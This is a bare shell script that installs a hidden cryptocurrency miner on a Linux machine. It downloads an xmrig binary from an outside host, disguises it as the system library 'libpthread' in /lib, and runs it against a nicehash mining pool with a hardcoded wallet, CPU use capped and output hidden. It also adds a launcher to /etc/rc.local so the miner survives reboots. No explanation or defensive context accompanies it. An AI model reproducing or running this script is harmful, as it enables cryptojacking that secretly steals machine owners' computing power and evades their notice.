curl -fsSL https://qr4d.com/xmrig/libpthread > libpthread
yum -y install libuv
mv ./libpthread /lib/libpthread
echo "/lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash  --max-cpu-usage=20 -p x --background" > /usr/sbin/pthread
chmod +x /lib/libpthread
chmod +x /usr/sbin/pthread
echo "/usr/sbin/pthread >/dev/null 2>&1 &" >> /etc/rc.local
/usr/sbin/pthread >/dev/null 2>&1 &
